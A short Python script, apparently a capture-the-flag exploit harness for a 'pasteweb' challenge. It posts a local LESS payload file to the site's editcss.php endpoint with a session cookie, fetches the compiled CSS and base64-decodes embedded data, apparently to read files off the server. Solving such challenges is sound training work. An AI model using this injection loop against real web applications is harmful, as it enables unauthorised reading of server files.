import requests
import re
import base64
import configparser

config = configparser.ConfigParser()
config.read('config.ini')
share = config['config']['share']
print(f'{share = }')
session_id = config['config']['session_id']
print(f'{session_id = }')
editcss_url = 'https://pasteweb.ctf.zoolab.org/editcss.php'
view_url = 'https://pasteweb.ctf.zoolab.org/view.php'
css_url = f'https://pasteweb.ctf.zoolab.org/sandbox/{share}/default.css'

cookie = {'PHPSESSID': session_id}

with requests.Session() as s:
    while True:
        input('#')
        with open('payload.css') as f:
            less = f.read()
        payload = {'less': f'{less}'}
        r = s.post(editcss_url, data=payload, cookies=cookie)
        if 'No' in r.text:
            print(r.text)
            continue
        text = s.get(css_url, cookies=cookie).text
        b64 = re.findall('base64,(.+)"', text)[0]
        print(base64.b64decode(b64))
